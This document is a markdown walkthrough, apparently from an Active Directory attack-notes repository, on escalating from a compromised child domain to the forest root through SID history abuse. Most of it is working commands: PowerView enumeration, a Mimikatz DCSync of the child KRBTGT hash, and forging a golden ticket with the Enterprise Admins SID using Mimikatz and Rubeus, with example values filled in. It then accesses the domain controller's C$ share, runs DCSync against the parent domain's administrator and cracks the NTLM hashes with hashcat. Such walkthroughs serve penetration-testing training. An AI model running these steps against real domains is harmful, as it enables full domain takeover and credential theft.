# Attacking Domain Trusts From Windows 🖥️
## SID History Primer
The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
SID history is intended to work across domains, but can work in the same domain.

---

## Attack scenario

To perform this attack, we must first **compromise the child domain**. Once access is gained, the following information is required:

* The **KRBTGT hash** of the child domain
* The **Security Identifier (SID)** of the child domain
* * The **SID of the Enterprise Admins group** from the root domain
* The **Fully Qualified Domain Name (FQDN)** of the child domain
* The **name of a target user** in the child domain (*note: the account does not need to actually exist*)

With all of this data gathered, the attack can then be executed using **Mimikatz**.

---
1. Check Domain Trust
**Using PowerView**
```powershell
Get-DomainTrust
```
Out Example:
<img width="1681" height="808" alt="image" src="https://github.com/user-attachments/assets/bc658c97-fa9f-4978-84b6-6aa7fc02bd80" />

2. Obtaining the KRBTGT Account's NT Hash using Mimikatz
```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
<img width="1000" height="408" alt="image" src="https://github.com/user-attachments/assets/cb302a40-7795-4cbf-8c73-2e5851d15873" />

3. Get Security Identifier (SID)
**Using PowersView**
```powershell
Get-DomainSID
```
<img width="709" height="66" alt="image" src="https://github.com/user-attachments/assets/f1aac421-d7b7-440b-9cdb-fa5d239a4e83" />

4. Get SID of the Enterprise Admins group of the root domain
**Using PowersView**
```powershell
Get-DomainGroup -Domain CORP.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
<img width="2188" height="328" alt="image" src="https://github.com/user-attachments/assets/27bdf486-88e5-4471-9b16-6054a5cd0685" />

6. FQDN of the child domain
```powershell
(Get-ADDomain).DNSRoot
```
Using PowerView
```powershelll
Get-NetDomain | select Name
```
8. The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: AnubisXploit
9. Creating a Golden Ticket with Mimikatz
```powershell
mimikatz # kerberos::golden /user:<FakeNAme> /domain:<ChildDomain> /sid:<SID-for-the-child-domain> /krbtgt:<KRBTGT-hash-for-the-child-domain> /sids:<SID of the Enterprise Admins group of the root domain> /ptt
```
For Our Current Example
```powershell
mimikatz # kerberos::golden /user:AnubisXploit /domain:LOGISTICS.CORP.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
<img width="1509" height="667" alt="image" src="https://github.com/user-attachments/assets/097eb638-2b2c-43ac-bdcb-f30e031c0075" />

No Ticket submitted for current session and we can check it using `klist`
```powershell
klist
```
<img width="1342" height="421" alt="image" src="https://github.com/user-attachments/assets/54369dc1-005d-47d2-b9a6-742dbf9786fc" />

10. Listing the Entire C: Drive of the Domain Controller
```powershell
ls \\dc01.CORP.local\c$
```
11. Creating a Golden Ticket using Rubeus - Another Way -
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.CORP.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:AnubisXploit /ptt
```
12. Performing a [DCSync](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/blob/main/Active%20Directory%20Attacks/Access%20Control%20List%20(ACL)%20Abuse/DS-Replication-Get-Changes_and_all.md) Attack
Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the 'admin_user' Domain Admin user.
**Inside Mimikatz, run the DCSync command:**
```powershell
lsadump::dcsync /domain:YOURDOMAIN.LOCAL /user:YOURDOMAIN\administrator
```
13. Cracking NTLM hashes in case the reversible encryption option not checked for users
```shell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
